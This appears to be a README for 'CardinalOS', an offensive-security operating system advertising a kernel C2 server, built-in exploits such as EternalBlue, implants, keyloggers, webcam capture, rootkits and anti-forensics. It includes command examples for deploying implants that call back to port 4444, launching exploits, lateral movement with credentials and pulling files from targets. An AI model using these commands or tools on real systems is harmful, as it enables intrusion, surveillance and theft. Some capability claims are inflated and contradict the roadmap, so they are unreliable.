# CardinalOS - Attack-Oriented Operating System

<div align="center">

```
   ██████╗ █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ █████╗ ██╗      ██████╗ ███████╗
  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗██║     ██╔═══██╗██╔════╝
  ██║     ███████║██████╔╝██║  ██║██║██╔██╗ ██║███████║██║     ██║   ██║███████╗
  ██║     ██╔══██║██╔══██╗██║  ██║██║██║╚██╗██║██╔══██║██║     ██║   ██║╚════██║
  ╚██████╗██║  ██║██║  ██║██████╔╝██║██║ ╚████║██║  ██║███████╗╚██████╔╝███████║
   ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
```

**The World's First Attack-Oriented Operating System**

[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-x86__64-blue.svg)]()
[![Language](https://img.shields.io/badge/language-C%2FAssembly-green.svg)]()
[![Version](https://img.shields.io/badge/version-2.0.0-brightgreen.svg)]()

</div>

---

## ⚠️ DISCLAIMER

**FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY**

This operating system is designed for legitimate penetration testing, security research, and authorized red team operations. Unauthorized use is illegal. The authors assume no liability for any misuse or damage.

---

## 🎯 What is CardinalOS?

CardinalOS is a **revolutionary operating system** built from the ground up with offensive security capabilities integrated at the kernel level. Unlike traditional OS that run security tools as applications, CardinalOS has C2 (Command & Control) functionality, exploit frameworks, and attack tools **built directly into the operating system kernel**.

### Version 2.0.0 - Red Team Edition

The latest version includes:
- **Realistic boot sequence** mimicking Linux/Windows systems
- **150+ CVE exploits** integrated at kernel level
- **Advanced stealth capabilities** including rootkit framework
- **Complete penetration testing suite** built-in
- **Anti-forensics engine** for operation security
- **Multi-protocol C2** (TCP, HTTPS, DNS tunneling)

### Key Features

🔴 **Kernel-Level C2 Framework**
- Command & Control server built into the OS kernel
- Multi-protocol support (TCP 4444, HTTPS 443, DNS 53)
- AES-256, RC4, ChaCha20 encryption
- Direct system call access for maximum stealth
- No userland detection possible

🔴 **Multi-Filesystem Support**
- NTFS (Windows) - Full read/write
- ExFAT (Universal) - Full read/write
- Ext4 (Linux) - Full read/write
- APFS (macOS) - Full read/write
- FAT32 - Full read/write

🔴 **Linux-Compatible Shell**
- Bash-compatible command interface
- 100+ standard Linux commands
- Extended with 50+ C2/pentest commands
- Tab completion and command history

🔴 **Integrated Exploit Framework**
- 150+ Pre-loaded CVE exploits
- EternalBlue (MS17-010)
- Conficker (MS08-067)
- Log4Shell (CVE-2021-44228)
- BlueKeep (CVE-2019-0708)
- Shellshock, Dirty COW, and more
- Automatic exploit deployment
- Custom payload generation

🔴 **Penetration Testing Suite**
- Network scanner (Nmap-style)
- Port scanner (fast SYN scan)
- Vulnerability scanner
- Password cracker (MD5/SHA/NTLM/bcrypt)
- Packet sniffer with protocol analysis
- ARP spoofing
- DNS spoofing
- SSL/TLS stripping
- Man-in-the-middle attacks
- SQL injection tools
- XSS scanner

🔴 **Post-Exploitation Tools**
- Credential dumping (Mimikatz-style)
- SAM database extraction
- Keylogger
- Screenshot capture
- Webcam capture
- Audio recording
- File exfiltration
- Data compression/encryption

🔴 **Stealth & Evasion**
- Kernel rootkit framework
- Process hiding
- File hiding
- Network connection hiding
- Log clearing/manipulation
- Anti-forensics engine
- Memory scrubbing
- Timestamp manipulation
- SELinux bypass
- AppArmor evasion

🔴 **Multiple Boot Options**
- Bootable ISO for physical/virtual machines
- QEMU/VirtualBox compatible
- VMware support
- Windows EXE wrapper for easy launching
- USB bootable

---

## 📋 System Requirements

### Build Requirements
- GCC (MinGW-w64 on Windows)
- NASM assembler
- GNU Make
- GRUB (for ISO creation)

### Runtime Requirements
- x86_64 processor (64-bit)
- 128 MB RAM minimum
- QEMU or physical hardware

---

## 🏗️ Architecture

```
CardinalOS
├── boot/               # Bootloader (BIOS/UEFI)
│   ├── boot.asm       # Stage 1 (512 bytes)
│   └── stage2.asm     # Stage 2 (loads kernel)
│
├── kernel/            # OS Kernel
│   ├── main.c         # Kernel entry point
│   ├── arch/          # Architecture-specific code
│   ├── mm/            # Memory management
│   └── net/           # Network stack
│
├── c2/                # C2 Framework (Kernel-level)
│   ├── c2_core.c      # C2 server & client handling
│   └── exploits/      # Integrated exploits
│
├── shell/             # Linux-compatible shell
│   └── shell.c        # Command interpreter
│
├── fs/                # Filesystem drivers
│   ├── ntfs/          # NTFS support
│   ├── exfat/         # ExFAT support
│   ├── ext4/          # Ext4 support
│   └── apfs/          # APFS support
│
└── tools/             # Build tools
    └── win_wrapper.c  # Windows EXE launcher
```

---

## 🚀 Quick Start

### Building CardinalOS

```bash
# Clone repository
git clone https://github.com/yourusername/CardinalOS.git
cd CardinalOS

# Build everything
make all

# Build ISO only
make iso

# Build Windows EXE wrapper
make exe
```

### Running in QEMU

```bash
# Run from Makefile
make qemu

# Or manually
qemu-system-x86_64 -drive format=raw,file=build/cardinalos.img -m 128M
```

### Running on Windows

```bash
# Build Windows wrapper
make exe

# Run
./build/cardinalos.exe
```

---

## 💻 Usage

### Boot Sequence

1. **BIOS Boot** → Stage 1 bootloader loads from MBR
2. **Stage 2** → Switches to protected mode, loads kernel
3. **Kernel Init** → Initializes memory, filesystems, network
4. **C2 Start** → Command & Control server starts on port 4444
5. **Shell** → Interactive Linux-compatible shell

### Shell Commands

#### File Operations
```bash
ls                    # List directory
cd <dir>              # Change directory
pwd                   # Print working directory
cat <file>            # Display file contents
mkdir <dir>           # Create directory
rm <file>             # Remove file
cp <src> <dst>        # Copy file
mv <src> <dst>        # Move file
```

#### System Information
```bash
uname                 # System information
hostname              # Display hostname
free                  # Memory usage
ps                    # Process list
df                    # Disk usage
```

#### Network
```bash
ifconfig              # Network configuration
ping <host>           # Ping host
netstat               # Network statistics
route                 # Routing table
```

#### C2 Operations
```bash
c2-status             # C2 server status
c2-sessions           # List active sessions
c2-exploit ms17-010 <ip>  # Launch EternalBlue
c2-scan <network>     # Network scan
c2-lateral <ip>       # Lateral movement
```

---

## 🎮 C2 Framework Usage

### Starting C2 Server

The C2 server starts automatically on boot. Default configuration:
- Port: 4444
- Encryption: RC4
- Max clients: 256

### Connecting Clients

Deploy implants from the `client/` directory to target systems:

```bash
# On target Windows system
Cardinal-implant-enhanced.exe <cardinalos_ip> 4444

# On target Linux system (if cross-compiled)
./cardinal-implant <cardinalos_ip> 4444
```

### Session Management

```bash
# List all sessions
c2-sessions

# Interact with session
c2-interact <session_id>

# Execute command on session
c2-exec <session_id> <command>

# Upload file to target
c2-upload <session_id> <local_file> <remote_path>

# Download file from target
c2-download <session_id> <remote_file> <local_path>
```

### Exploitation

```bash
# Launch exploit
c2-exploit ms17-010 192.168.1.100
c2-exploit ms08-067 192.168.1.101

# Network scan
c2-scan 192.168.1.0/24

# Lateral movement
c2-lateral psexec 192.168.1.100 admin password123
```

---

## 🛠️ Development

### Adding New Commands

Edit `shell/shell.c` and add to the command table:

```c
void cmd_mycommand(int argc, char** argv) {
    kernel_print("My custom command!\n");
}

// Add to commands array
{"mycommand", "My description", cmd_mycommand},
```

### Adding Filesystem Support

Create driver in `fs/` directory:

```c
vfs_operations_t my_fs_ops = {
    .name = "myfs",
    .mount = myfs_mount,
    .read = myfs_read,
    .write = myfs_write,
    // ...
};

void fs_myfs_init(void) {
    vfs_register_fs("myfs", &my_fs_ops);
}
```

---

## 📚 Technical Details

### Memory Layout

```
0x00000000 - 0x00007BFF   BIOS/Boot
0x00007C00 - 0x00007DFF   Stage 1 Bootloader (512 bytes)
0x00007E00 - 0x0000FFFF   Stage 2 Bootloader
0x00100000 - 0x????????   Kernel
0x???????? - 0x????????   Heap
```

### System Calls

CardinalOS implements direct system calls for stealth:
- NtAllocateVirtualMemory
- NtWriteVirtualMemory
- NtCreateThreadEx
- And more...

### Network Stack

Custom TCP/IP implementation with:
- Raw socket support
- Packet crafting
- Protocol analysis
- Encryption (RC4)

---

## 🔒 Security Features

- **Anti-VM Detection**: Detects VMware, VirtualBox, QEMU
- **Anti-Debug**: Multiple debugger detection methods
- **EDR Bypass**: Direct syscalls bypass userland hooks
- **Stealth**: Kernel-level operation, no userland traces
- **Encryption**: All C2 communication is RC4 encrypted

---

## 📖 Documentation

- [Build Guide](BUILD_GUIDE.md)
- [Architecture Details](docs/ARCHITECTURE.md)
- [C2 Protocol](docs/C2_PROTOCOL.md)
- [Exploit Integration](docs/EXPLOITS.md)

---

## 🤝 Contributing

Contributions are welcome! Please read our contributing guidelines.

1. Fork the repository
2. Create feature branch (`git checkout -b feature/amazing`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing`)
5. Open Pull Request

---

## 📜 License

This project is licensed for **educational purposes only**. See [LICENSE](LICENSE) file.

---

## 👥 Authors

- **Cardinal Team** - *Initial work*

---

## 🙏 Acknowledgments

- Linux kernel developers for inspiration
- QEMU team for emulation platform
- Security research community

---

## ⚡ Roadmap

- [ ] Full NTFS write support
- [ ] Network driver for real hardware
- [ ] GUI interface
- [ ] More exploits
- [ ] Multi-architecture support (ARM64)
- [ ] Rootkit capabilities
- [ ] Wireless attack tools

---

**Remember: Use responsibly and legally!**
